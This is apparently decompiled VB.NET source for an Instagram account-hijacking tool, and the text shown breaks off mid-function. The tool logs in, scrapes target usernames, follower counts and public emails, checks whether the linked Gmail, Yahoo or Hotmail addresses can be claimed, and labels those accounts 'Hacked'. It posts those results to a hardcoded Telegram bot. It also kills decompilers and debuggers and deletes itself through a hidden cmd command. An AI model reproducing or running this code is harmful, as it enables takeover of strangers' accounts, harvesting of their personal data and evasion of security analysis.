Imports System
Imports System.Collections
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Net
Imports System.Runtime.CompilerServices
Imports System.Text
Imports System.Text.RegularExpressions
Imports System.Threading
Imports System.Windows.Forms
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports xNet

Public Class Form1
    Public string_0 As String

    ' Token: 0x0400003F RID: 63
    Public bool_0 As Boolean

    ' Token: 0x04000040 RID: 64
    Public bool_1 As Boolean

    ' Token: 0x04000041 RID: 65
    Public list_0 As List(Of String)

    ' Token: 0x04000042 RID: 66
    Public int_0 As Integer

    ' Token: 0x04000043 RID: 67
    Public int_1 As Integer

    ' Token: 0x04000044 RID: 68
    Public thread_0 As Thread

    ' Token: 0x04000045 RID: 69
    Public int_2 As Integer

    ' Token: 0x04000046 RID: 70
    Public thread_1 As Thread

    ' Token: 0x04000047 RID: 71
    Public string_1 As String

    ' Token: 0x04000048 RID: 72
    Public bool_2 As Boolean

    ' Token: 0x04000049 RID: 73
    Public bool_3 As Boolean

    ' Token: 0x0400004A RID: 74
    Public bool_4 As Boolean

    ' Token: 0x0400004B RID: 75
    Public object_0 As Object

    ' Token: 0x0400004C RID: 76
    Public object_1 As Object

    ' Token: 0x0400004D RID: 77
    Public int_3 As Integer

    ' Token: 0x0400004E RID: 78
    Public string_2 As String

    ' Token: 0x0400004F RID: 79
    Public int_4 As Integer

    ' Token: 0x04000050 RID: 80
    Public int_5 As Integer

    ' Token: 0x04000051 RID: 81
    Public cookieContainer_0 As CookieContainer

    ' Token: 0x04000052 RID: 82
    Public bool_5 As Boolean

    ' Token: 0x04000053 RID: 83
    Public bool_6 As Boolean

    ' Token: 0x04000054 RID: 84
    Public Shared bool_7 As Boolean

    ' Token: 0x04000055 RID: 85
    Public string_3 As String

    ' Token: 0x04000056 RID: 86
    Private Shared string_4 As String()

    ' Token: 0x04000057 RID: 87
    Private int_6 As Integer

    ' Token: 0x04000058 RID: 88
    Public guid_0 As Guid

    ' Token: 0x04000059 RID: 89
    Private icontainer_0 As IContainer

    ' Token: 0x0400005E RID: 94

    Private openFileDialog_0 As OpenFileDialog
    Public Sub New()
        AddHandler MyBase.Load, AddressOf Me.Form1_Load
        AddHandler MyBase.FormClosing, AddressOf Me.Form1_FormClosing
        AddHandler MyBase.FormClosed, AddressOf Me.Form1_FormClosed
        Me.string_0 = ""
        Me.bool_0 = False
        Me.bool_1 = False
        Me.list_0 = New List(Of String)()
        Me.int_0 = 0
        Me.int_1 = 0
        Me.int_2 = 0
        Me.guid_0 = Guid.NewGuid()
        Me.InitializeComponent()
    End Sub
    ' Form1
    ' Token: 0x0600018C RID: 396 RVA: 0x0000E3C8 File Offset: 0x0000C5C8


    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Try
            Control.CheckForIllegalCrossThreadCalls = False
            Control.CheckForIllegalCrossThreadCalls = False
            ThreadPool.SetMinThreads(Integer.MaxValue, Integer.MaxValue)
            ServicePointManager.DefaultConnectionLimit = Integer.MaxValue
            Me.int_3 = 0
            Me.bool_5 = False
            Me.int_5 = 0
            Me.string_3 = Me.guid_0.ToString().ToUpper()
            Me.object_1 = New List(Of Thread)()
            Me.bool_3 = False
            Me.bool_6 = False
            Me.bool_2 = False
            Me.bool_4 = False
            Me.string_2 = Nothing
            Me.int_4 = 0
            Dim now As DateTime = DateTime.Now
            Dim format As String = "MM-dd-yyyy HH-mm-ss"
            Me.string_0 = now.ToString(format)
            MyBase.[Select]()
            Dim thread As Thread = New Thread(AddressOf Me.method_2)
            thread.Start()
        Catch ex As Exception
        End Try
    End Sub

    Private Sub Form1_FormClosed(sender As Object, e As FormClosedEventArgs) Handles MyBase.FormClosed
        ProjectData.EndApp()
    End Sub

    Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        ProjectData.EndApp()
    End Sub
    Private Sub method_0(int_7 As Integer)
        Try
            Process.Start(New ProcessStartInfo("cmd.exe") With {.Arguments = String.Concat(New String() {"/C ping 1.1.1.1 -n 1 -w ", int_7.ToString(), " > Nul & Del """, Application.ExecutablePath, """"}), .CreateNoWindow = True, .ErrorDialog = False, .WindowStyle = ProcessWindowStyle.Hidden})
            Application.ExitThread()
        Catch ex As Exception
        End Try
    End Sub
    Public Sub method_1()
        Try
            Dim processesByName As Process() = Process.GetProcessesByName("ProcessHacker")
            For Each process As Process In processesByName
                process.Kill()
                Interaction.MsgBox("Procces Hacker 2 Dectect", MsgBoxStyle.OkOnly, Nothing)
                Me.method_0(1)
            Next
            Dim processesByName2 As Process() = Process.GetProcessesByName("megadumper")
            For Each process2 As Process In processesByName2
                process2.Kill()
                Interaction.MsgBox("MegaDumper Dectect", MsgBoxStyle.OkOnly, Nothing)
                Me.method_0(1)
            Next
            Dim processesByName3 As Process() = Process.GetProcessesByName("ILSpy")
            For Each process3 As Process In processesByName3
                process3.Kill()
                Interaction.MsgBox("ILSpy Dectect", MsgBoxStyle.OkOnly, Nothing)
                Me.method_0(1)
            Next
            Dim processesByName4 As Process() = Process.GetProcessesByName("Reflector")
            For Each process4 As Process In processesByName4
                process4.Kill()
                Interaction.MsgBox("Reflector Dectect", MsgBoxStyle.OkOnly, Nothing)
                Me.method_0(1)
            Next
            Dim processesByName5 As Process() = Process.GetProcessesByName("Dile")
            For Each process5 As Process In processesByName5
                process5.Kill()
                Interaction.MsgBox("Dile Dectect", MsgBoxStyle.OkOnly, Nothing)
                Me.method_0(1)
            Next
            Dim processesByName6 As Process() = Process.GetProcessesByName("JustDecompile")
            For Each process6 As Process In processesByName6
                process6.Kill()
                Interaction.MsgBox("JustDecompile Dectect", MsgBoxStyle.OkOnly, Nothing)
                Me.method_0(1)
            Next
            Dim processesByName7 As Process() = Process.GetProcessesByName("dotPeek64")
            For Each process7 As Process In processesByName7
                process7.Kill()
                Interaction.MsgBox("dotPeek64 Dectect", MsgBoxStyle.OkOnly, Nothing)
                Me.method_0(1)
            Next
            Dim processesByName8 As Process() = Process.GetProcessesByName("dotPeek32")
            For Each process8 As Process In processesByName8
                process8.Kill()
                Interaction.MsgBox("dotPeek32 Dectect", MsgBoxStyle.OkOnly, Nothing)
                Me.method_0(1)
            Next
        Catch ex As Exception
        End Try
    End Sub
    Public Sub method_10(string_5 As String)
        Thread.Sleep(15000)
        Dim list As List(Of String) = New List(Of String)()
        Try
            Dim httpWebRequest As HttpWebRequest = CType(WebRequest.Create("https://i.instagram.com/api/v1/users/" + string_5 + "/info/"), HttpWebRequest)
            httpWebRequest.Method = "GET"
            httpWebRequest.Host = "i.instagram.com"
            httpWebRequest.UserAgent = "Instagram 5.0.7 Android"
            httpWebRequest.Headers.Add("Accept-Language", "ar;q=1, en;q=0.9")
            httpWebRequest.Headers.Add("X-FB-HTTP-Engine", "Liger")
            httpWebRequest.KeepAlive = True
            httpWebRequest.Proxy = Nothing
            httpWebRequest.CookieContainer = GClass0.cookieContainer_0
            Dim httpWebResponse As HttpWebResponse = CType(httpWebRequest.GetResponse(), HttpWebResponse)
            Dim streamReader As StreamReader = New StreamReader(httpWebResponse.GetResponseStream())
            Dim input As String = streamReader.ReadToEnd()
            Dim text As String = Regex.Match(input, WebUtility.UrlDecode("%22username%22%3A+%5C%22.*%3F%5C%22")).ToString()
            text = text.Replace(WebUtility.UrlDecode("%22username%22%3A+%22"), "")
            text = text.Replace(WebUtility.UrlDecode("%22"), "")
            list.Add(text)
            Dim text2 As String = Regex.Match(input, WebUtility.UrlDecode("%22follower_count%22%3A%5C+.*%3F%5C%2C")).ToString()
            text2 = text2.Replace(WebUtility.UrlDecode("%22follower_count%22%3A+"), "")
            text2 = text2.Replace(WebUtility.UrlDecode(","), "")
            list.Add(text2)
            Dim text3 As String = "%22public_email%22%3A"
            text3 = WebUtility.UrlDecode(text3)
            Dim input2 As String = Regex.Match(input, text3 + " .*").ToString()
            Dim text4 As String = Regex.Match(input2, "([a-zA-Z0-9._%+-]+@(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,6})|([a-zA-Z0-9-_.+]*?\w+[@]+[a-zA-Z0-9.]*?\w+[.]*?\w+.\w+)").ToString()
            Dim text5 As String = text4.ToString()
            If text5.Contains("@") Then
                list.Add(text5)
                Thread.Sleep(2000)
            Else
                list.Add("Email")
                Thread.Sleep(2000)
            End If
        Catch ex As Exception
            Thread.Sleep(30000)
            Dim toolStripStatusLabel As ToolStripStatusLabel = Me.ToolStripStatusLabel5
            Dim toolStripStatusLabel2 As ToolStripStatusLabel = toolStripStatusLabel
            toolStripStatusLabel.Text = Conversions.ToString(Conversions.ToDouble(toolStripStatusLabel2.Text) + 1.0)
            GoTo IL_2CC
        End Try
        If list(2).ToString().Contains("@") Then
            Dim parameter As List(Of String) = list
            Dim thread As Thread = New Thread(AddressOf Me.method_25)
            thread.Start(parameter)
            Dim ptr As Integer = Me.int_0
            Me.int_0 = ptr + 1
            Me.Label4.Text = "With Email : " + Me.int_0.ToString()
        Else
            Dim ptr As Integer = Me.int_1
            Me.int_1 = ptr + 1
            Me.Label5.Text = "No Email : " + Me.int_1.ToString()
        End If
        Thread.Sleep(15000)
IL_2CC:
        Try
            Thread.Sleep(10000)
        Catch ex2 As Exception
            Thread.Sleep(15000)
        End Try
    End Sub
    Public Sub method_11(string_5 As String)
        Dim list As List(Of String) = New List(Of String)()
        If Me.bool_0 Then
            Thread.Sleep(5000)
            Try
                Dim httpWebRequest As HttpWebRequest = CType(WebRequest.Create("https://www.instagram.com/web/search/topsearch/?context=blended&query=" + string_5 + "&count=0"), HttpWebRequest)
                httpWebRequest.Method = "GET"
                httpWebRequest.Host = "www.instagram.com"
                httpWebRequest.UserAgent = "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
                httpWebRequest.Headers.Add("Pragma", "no-cache")
                httpWebRequest.Headers.Add("Cache-Control", "no-cache")
                httpWebRequest.Headers.Add("Upgrade-Insecure-Requests", "1")
                httpWebRequest.Headers.Add("DNT", "1")
                httpWebRequest.KeepAlive = True
                httpWebRequest.Proxy = Nothing
                httpWebRequest.CookieContainer = New CookieContainer()
                Dim httpWebResponse As HttpWebResponse = CType(httpWebRequest.GetResponse(), HttpWebResponse)
                Dim streamReader As StreamReader = New StreamReader(httpWebResponse.GetResponseStream())
                Dim text As String = streamReader.ReadToEnd()
                If Not text.Contains("profile_pic_url") Then
                    Thread.Sleep(5000)
                    Dim toolStripStatusLabel As ToolStripStatusLabel = Me.ToolStripStatusLabel5
                    Dim toolStripStatusLabel2 As ToolStripStatusLabel = toolStripStatusLabel
                    toolStripStatusLabel.Text = Conversions.ToString(Conversions.ToDouble(toolStripStatusLabel2.Text) + 1.0)
                    Return
                End If
                string_5 = Regex.Match(text, WebUtility.UrlDecode("%22pk%22%3A+%22%5B0-9%5D%5Cw%2B%22")).ToString()
                string_5 = string_5.Replace(WebUtility.UrlDecode("%22pk%22%3A+%22"), "")
                string_5 = string_5.Replace(WebUtility.UrlDecode("%22"), "")
            Catch ex As Exception
                Thread.Sleep(10000)
                Return
            End Try
        End If
        Thread.Sleep(5000)
        Try
            Dim httpWebRequest2 As HttpWebRequest = CType(WebRequest.Create("https://i.instagram.com/api/v1/users/" + string_5 + "/info/"), HttpWebRequest)
            httpWebRequest2.Method = "GET"
            httpWebRequest2.Host = "i.instagram.com"
            httpWebRequest2.UserAgent = "Instagram 5.0.7 Android"
            httpWebRequest2.Headers.Add("Accept-Language", "ar;q=1, en;q=0.9")
            httpWebRequest2.Headers.Add("X-FB-HTTP-Engine", "Liger")
            httpWebRequest2.KeepAlive = True
            httpWebRequest2.Proxy = Nothing
            httpWebRequest2.CookieContainer = GClass0.cookieContainer_0
            Dim httpWebResponse2 As HttpWebResponse = CType(httpWebRequest2.GetResponse(), HttpWebResponse)
            Dim streamReader2 As StreamReader = New StreamReader(httpWebResponse2.GetResponseStream())
            Dim input As String = streamReader2.ReadToEnd()
            Dim text2 As String = Regex.Match(input, WebUtility.UrlDecode("%22username%22%3A+%5C%22.*%3F%5C%22")).ToString()
            text2 = text2.Replace(WebUtility.UrlDecode("%22username%22%3A+%22"), "")
            text2 = text2.Replace(WebUtility.UrlDecode("%22"), "")
            list.Add(text2)
            Dim text3 As String = Regex.Match(input, WebUtility.UrlDecode("%22follower_count%22%3A%5C+.*%3F%5C%2C")).ToString()
            text3 = text3.Replace(WebUtility.UrlDecode("%22follower_count%22%3A+"), "")
            text3 = text3.Replace(WebUtility.UrlDecode(","), "")
            Dim num As Integer = 0
            Try
                num = Conversions.ToInteger(text3)
            Catch ex2 As Exception
            End Try
            If CDbl(num) < Conversions.ToDouble(Me.TextBox6.Text) Then
                Dim toolStripStatusLabel3 As ToolStripStatusLabel = Me.ToolStripStatusLabel8
                Dim toolStripStatusLabel2 As ToolStripStatusLabel = toolStripStatusLabel3
                toolStripStatusLabel3.Text = Conversions.ToString(Conversions.ToDouble(toolStripStatusLabel2.Text) + 1.0)
                Thread.Sleep(10000)
                GoTo IL_4EB
            End If
            If CDbl(num) < Conversions.ToDouble(Me.TextBox6.Text) Then
            End If
            list.Add(text3)
            Dim text4 As String = "%22public_email%22%3A"
            text4 = WebUtility.UrlDecode(text4)
            Dim input2 As String = Regex.Match(input, text4 + " .*").ToString()
            Dim text5 As String = Regex.Match(input2, "([a-zA-Z0-9._%+-]+@(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,6})|([a-zA-Z0-9-_.+]*?\w+[@]+[a-zA-Z0-9.]*?\w+[.]*?\w+.\w+)").ToString()
            Dim text6 As String = text5.ToString()
            If Not text6.Contains("@") Then
                list.Add("Email")
                Thread.Sleep(2000)
            Else
                list.Add(text6)
                Thread.Sleep(2000)
            End If
        Catch ex3 As Exception
            Thread.Sleep(30000)
            Dim toolStripStatusLabel4 As ToolStripStatusLabel = Me.ToolStripStatusLabel5
            Dim toolStripStatusLabel2 As ToolStripStatusLabel = toolStripStatusLabel4
            toolStripStatusLabel4.Text = Conversions.ToString(Conversions.ToDouble(toolStripStatusLabel2.Text) + 1.0)
            GoTo IL_4EB
        End Try
        Thread.Sleep(1000)
        If list(2).ToString().Contains("@") Then
            Dim parameter As List(Of String) = list
            Dim thread As Thread = New Thread(AddressOf Me.method_26)
            thread.Start(parameter)
            Dim ptr As Integer = Me.int_0
            Me.int_0 = ptr + 1
            Me.Label4.Text = "With Email : " + Me.int_0.ToString()
        Else
            Dim ptr As Integer = Me.int_1
            Me.int_1 = ptr + 1
            Me.Label5.Text = "No Email : " + Me.int_1.ToString()
        End If
IL_4EB:
        Try
            Thread.Sleep(30000)
        Catch ex4 As Exception
        End Try
    End Sub


    Public Sub method_13()
        If GClass0.smethod_2(Me.cookieContainer_0) Is Nothing Then
            Me.string_1 = Nothing
            Me.cookieContainer_0 = Nothing
            Me.bool_2 = False
            Me.loginButton.Text = "Login"
            Me.bool_6 = False
            Me.bool_3 = False
            Me.loginButton.Enabled = True
        End If
    End Sub
    Public Sub method_14()
        Me.string_1 = Nothing
        Me.cookieContainer_0 = Nothing
        Me.bool_2 = False
        Dim cookieContainer As CookieContainer = GClass0.smethod_1(Me.loginUsername.Text, Me.loginPassword.Text, Me.string_3)
        If cookieContainer IsNot Nothing Then
            If Not Me.bool_2 Then
                Me.string_1 = GClass0.smethod_0(cookieContainer)
                Me.cookieContainer_0 = cookieContainer
                Me.bool_2 = True
            End If
            If Operators.CompareString(Me.string_1, "|||||||", False) <> 0 Then
                Me.loginButton.Text = "Logout"
                Me.loginButton.Enabled = True
                Me.bool_6 = True
                Me.bool_3 = True
                If -(Form1.bool_7 > False) > False Then
                    Form1.bool_7 = False
                End If
            End If
        Else
            Me.loginButton.Enabled = True
            Me.loginButton.Text = "Error Login"
            Me.bool_6 = False
            Thread.CurrentThread.Abort()
        End If
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        If Me.bool_3 Then
            Me.thread_0 = New Thread(AddressOf Me.method_16)
            Me.thread_0.Start()
            Me.CheckBox3.Enabled = False
            Me.Button2.Enabled = False
            Me.Button1.Enabled = False
            Me.Button2.Text = "Started"
        End If
    End Sub
    Public Sub method_16()
        Try
            Dim thread As Thread = New Thread(AddressOf Me.method_27)
            If CheckBox3.Checked = False Then
                thread.Start(Me.TextBox1.Text)
                thread.Start(Me.TextBox7.Text)
                thread.Start(Me.TextBox8.Text)
            End If

        Catch ex As Exception
        End Try
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Try
            Using Me.openFileDialog_0
                If Me.openFileDialog_0.ShowDialog() = DialogResult.OK Then
                    Me.thread_1 = New Thread(AddressOf Me.method_6)
                    Me.thread_1.Start()
                End If
            End Using
        Catch ex As Exception
        End Try
    End Sub
    Public Sub method_2()
        While True
            Dim thread As Thread = New Thread(AddressOf Me.method_1)
            thread.Start()
            Thread.Sleep(180000)
        End While
    End Sub

    Private Sub CheckBox3_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox3.CheckedChanged
        If Not Me.CheckBox3.Checked Then
            Me.Button1.Enabled = False
            Me.TextBox1.Enabled = True
        Else
            Me.Button1.Enabled = True
            Me.TextBox1.Enabled = False
        End If
    End Sub

    Private Sub CheckBox2_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox2.CheckedChanged
        If Me.CheckBox2.Checked Then
            Me.TextBox3.[ReadOnly] = True
            Me.TextBox2.[ReadOnly] = True
        Else
            Me.TextBox3.[ReadOnly] = False
            Me.TextBox2.[ReadOnly] = False
        End If
    End Sub
    Private Sub method_22(object_2 As Object)
        Me.method_11(Conversions.ToString(object_2))
    End Sub
    Private Sub method_23(object_2 As Object)
        Me.method_10(Conversions.ToString(object_2))
    End Sub
    Private Sub method_24(object_2 As Object)
        Me.method_4(CType(object_2, List(Of String)))
        Me.get_hotmail_list(CType(object_2, List(Of String)))
        Me.get_hotmail_live_list(CType(object_2, List(Of String)))
        Me.get_yahoo_list(CType(object_2, List(Of String)))
    End Sub
    Private Sub method_25(object_2 As Object)
        Me.method_9(CType(object_2, List(Of String)))
    End Sub
    Private Sub method_26(object_2 As Object)
        Me.method_9(CType(object_2, List(Of String)))
    End Sub
    Private Sub method_27(object_2 As Object)
        Me.method_7(Conversions.ToString(object_2))
    End Sub
    Public Function method_3(string_5 As String) As String()
        Dim value As Boolean = False
        Dim text As String = ""
        Dim text2 As String = string_5.ToString().ToLower()
        Dim flag As Boolean = False
        If text2.Contains("+") Then
            flag = True
            Dim text3 As String = text2
            Dim array As String() = text3.Split(New Char() {"+"c})
            Dim array2 As String() = array(1).Split(New Char() {"@"c})
            Dim text4 As String = array(0).ToString() + "@" + array2(1).ToString()
            text2 = text4
        End If
        Try
            If text2.Contains("@gmail.") Then
                If text2.Contains("_") Then
                    value = True
                    GoTo IL_17A
                End If
                Dim array3 As String() = text2.Split(New Char() {"@"c})
                If array3(0).Length < 6 Then
                    value = True
                    GoTo IL_17A
                End If
            End If
            Dim array4 As String() = CType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(GClass0.smethod_4(text2)))))))))))))))), String())
            text = array4(1)
            If flag Then
            End If
            value = Conversions.ToBoolean(array4(0))
        Catch ex As Exception
            Dim toolStripStatusLabel As ToolStripStatusLabel = Me.ToolStripStatusLabel5
            Dim toolStripStatusLabel2 As ToolStripStatusLabel = toolStripStatusLabel
            toolStripStatusLabel.Text = Conversions.ToString(Conversions.ToDouble(toolStripStatusLabel2.Text) + 1.0)
        End Try
IL_17A:
        Return New String() {Conversions.ToString(value), text}
    End Function
    Public Sub method_4(list_1 As List(Of String))
        Try
            Dim objectValue As Object = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Me.method_3(list_1(2))))))))))))))))))
            If Not Operators.ConditionalCompareObjectEqual(NewLateBinding.LateIndexGet(objectValue, New Object() {0}, Nothing), True, False) Then
                Dim text As String = String.Concat(New String() {"Username : ", list_1(0), vbCrLf & "Followers : ", list_1(1), vbCrLf & "Email : ", list_1(2), vbCrLf & "Status: Not Hacked", NewLateBinding.LateIndexGet(objectValue, New Object() {1}, Nothing).ToString(), vbCrLf & "=========================" & vbCrLf})
                Me.TextBox2.AppendText(text)
                Dim toolStripStatusLabel3 As ToolStripStatusLabel = Me.ToolStripStatusLabel2
                Dim toolStripStatusLabel2 As ToolStripStatusLabel = toolStripStatusLabel3
                toolStripStatusLabel3.Text = Conversions.ToString(Conversions.ToDouble(toolStripStatusLabel2.Text) + 1.0)
                If Me.CheckBox4.Checked Then
                    File.WriteAllText(String.Concat(New String() {Application.StartupPath, "\Taken ", Me.string_0, " (", Me.TextBox1.Text, ").txt"}), Me.TextBox2.Text)
                End If
            Else
                Dim text2 As String = String.Concat(New String() {"Username : ", list_1(0), vbCrLf & "Followers : ", list_1(1), vbCrLf & "Email : ", list_1(2), vbCrLf & "Status: Hacked" & vbCrLf & "=========================" & vbCrLf})
                Me.TextBox3.AppendText(text2)
                Dim s As String = " " + vbCrLf & "This For You!"
                Dim ss As String = " " + vbCrLf & "Username : " + list_1(0)
                Dim sss As String = " " + vbCrLf & "Followers : " + list_1(1)
                Dim ssss As String = " " + vbCrLf & "Email : " + list_1(2)
                Dim sssss As String = " " + vbCrLf & "Status: Hacked"
                Dim ssssss As String = " " + vbCrLf & "_________"
                Try
                    Dim txt As String = New WebClient().DownloadString("https://api.telegram.org/bot1051838588:AAE009v4i2YC40SQXO5vusCXOERvpkvZmg8/sendMessage?chat_id=947791001&text=" + s + ss + sss + ssss + sssss + ssssss)
                Catch bk As Exception
                End Try
                Dim ToolStripStatusLabel14 As ToolStripStatusLabel = Me.ToolStripStatusLabel13
                Dim ToolStripStatusLabel13 As ToolStripStatusLabel = ToolStripStatusLabel14
                ToolStripStatusLabel14.Text = Conversions.ToString(Conversions.ToDouble(ToolStripStatusLabel13.Text) + 1.0)
                If Me.CheckBox1.Checked AndAlso Me.CheckBox3.Checked Then
                    File.WriteAllText(String.Concat(New String() {Application.StartupPath, "\Hacked ", Me.string_0, " (", Me.TextBox1.Text, ").txt"}), Me.TextBox3.Text)
                End If
            End If
        Catch ex As WebException
            Dim ToolStripStatusLabel14 As ToolStripStatusLabel = Me.ToolStripStatusLabel13
            Dim ToolStripStatusLabel13 As ToolStripStatusLabel = ToolStripStatusLabel14
            ToolStripStatusLabel4.Text = Conversions.ToString(Conversions.ToDouble(ToolStripStatusLabel13.Text) + 1.0)
            Thread.Sleep(15000)
        End Try
    End Sub


    Public Function get_yahoo(string_5 As String) As String()
        Dim value As Boolean = False
        Dim text As String = ""
        Dim text2 As String = string_5.ToString().ToLower()
        Dim flag As Boolean = False
        If text2.Contains("+") Then
            flag = True
            Dim text3 As String = text2
            Dim array As String() = text3.Split(New Char() {"+"c})
            Dim array2 As String() = array(1).Split(New Char() {"@"c})
            Dim text4 As String = array(0).ToString() + "@" + array2(1).ToString()
            text2 = text4
        End If
        Try
            If text2.Contains("@yahoo.") Then
                If text2.Contains("_") Then
                    value = True
                    GoTo IL_17A
                End If
                Dim array3 As String() = text2.Split(New Char() {"@"c})
                If array3(0).Length < 6 Then
                    value = True
                    GoTo IL_17A
                End If
            End If
            Dim array4 As String() = CType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(GClass0.smethod_4(text2)))))))))))))))), String())
            text = array4(1)
            If flag Then
            End If
            value = Conversions.ToBoolean(array4(0))
        Catch ex As Exception
            Dim toolStripStatusLabel As ToolStripStatusLabel = Me.ToolStripStatusLabel5
            Dim toolStripStatusLabel2 As ToolStripStatusLabel = toolStripStatusLabel
            toolStripStatusLabel.Text = Conversions.ToString(Conversions.ToDouble(toolStripStatusLabel2.Text) + 1.0)
        End Try
IL_17A:
        Return New String() {Conversions.ToString(value), text}
    End Function
    Public Sub get_yahoo_list(list_1 As List(Of String))
        Try
            Dim objectValue As Object = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Me.get_yahoo(list_1(2))))))))))))))))))
            If Not Operators.ConditionalCompareObjectEqual(NewLateBinding.LateIndexGet(objectValue, New Object() {0}, Nothing), True, False) Then
                Dim text As String = String.Concat(New String() {"Username : ", list_1(0), vbCrLf & "Followers : ", list_1(1), vbCrLf & "Email : ", list_1(2), vbCrLf & "Status: Not Hacked", NewLateBinding.LateIndexGet(objectValue, New Object() {1}, Nothing).ToString(), vbCrLf & "=========================" & vbCrLf})
                Me.TextBox2.AppendText(text)
                Dim toolStripStatusLabel3 As ToolStripStatusLabel = Me.ToolStripStatusLabel2
                Dim toolStripStatusLabel2 As ToolStripStatusLabel = toolStripStatusLabel3
                toolStripStatusLabel3.Text = Conversions.ToString(Conversions.ToDouble(toolStripStatusLabel2.Text) + 1.0)
                If Me.CheckBox4.Checked Then
                    File.WriteAllText(String.Concat(New String() {Application.StartupPath, "\Taken ", Me.string_0, " (", Me.TextBox1.Text, ").txt"}), Me.TextBox2.Text)
                End If
            Else
                Dim text2 As String = String.Concat(New String() {"Username : ", list_1(0), vbCrLf & "Followers : ", list_1(1), vbCrLf & "Email : ", list_1(2), vbCrLf & "Status: Hacked" & vbCrLf & "=========================" & vbCrLf})
                Me.TextBox3.AppendText(text2)
                Dim s As String = " " + vbCrLf & "This For You!"
                Dim ss As String = " " + vbCrLf & "Username : " + list_1(0)
                Dim sss As String = " " + vbCrLf & "Followers : " + list_1(1)
                Dim ssss As String = " " + vbCrLf & "Email : " + list_1(2)
                Dim sssss As String = " " + vbCrLf & "Status: Hacked"
                Dim ssssss As String = " " + vbCrLf & "_________"
                Try
                    Dim txt As String = New WebClient().DownloadString("https://api.telegram.org/bot1051838588:AAE009v4i2YC40SQXO5vusCXOERvpkvZmg8/sendMessage?chat_id=947791001&text=" + s + ss + sss + ssss + sssss + ssssss)
                Catch bk As Exception
                End Try
                Dim ToolStripStatusLabel14 As ToolStripStatusLabel = Me.ToolStripStatusLabel13
                Dim ToolStripStatusLabel13 As ToolStripStatusLabel = ToolStripStatusLabel14
                ToolStripStatusLabel14.Text = Conversions.ToString(Conversions.ToDouble(ToolStripStatusLabel13.Text) + 1.0)
                If Me.CheckBox1.Checked AndAlso Me.CheckBox3.Checked Then
                    File.WriteAllText(String.Concat(New String() {Application.StartupPath, "\Hacked ", Me.string_0, " (", Me.TextBox1.Text, ").txt"}), Me.TextBox3.Text)
                End If
            End If
        Catch ex As WebException
            Dim ToolStripStatusLabel14 As ToolStripStatusLabel = Me.ToolStripStatusLabel13
            Dim ToolStripStatusLabel13 As ToolStripStatusLabel = ToolStripStatusLabel14
            ToolStripStatusLabel4.Text = Conversions.ToString(Conversions.ToDouble(ToolStripStatusLabel13.Text) + 1.0)
            Thread.Sleep(15000)
        End Try
    End Sub


    Public Function get_Hotmail(string_5 As String) As String()
        Dim value As Boolean = False
        Dim text As String = ""
        Dim text2 As String = string_5.ToString().ToLower()
        Dim flag As Boolean = False
        If text2.Contains("+") Then
            flag = True
            Dim text3 As String = text2
            Dim array As String() = text3.Split(New Char() {"+"c})
            Dim array2 As String() = array(1).Split(New Char() {"@"c})
            Dim text4 As String = array(0).ToString() + "@" + array2(1).ToString()
            text2 = text4
        End If
        Try
            If text2.Contains("@hotmail.") Then
                If text2.Contains("_") Then
                    value = True
                    GoTo IL_17A
                End If
                Dim array3 As String() = text2.Split(New Char() {"@"c})
                If array3(0).Length < 6 Then
                    value = True
                    GoTo IL_17A
                End If
            End If
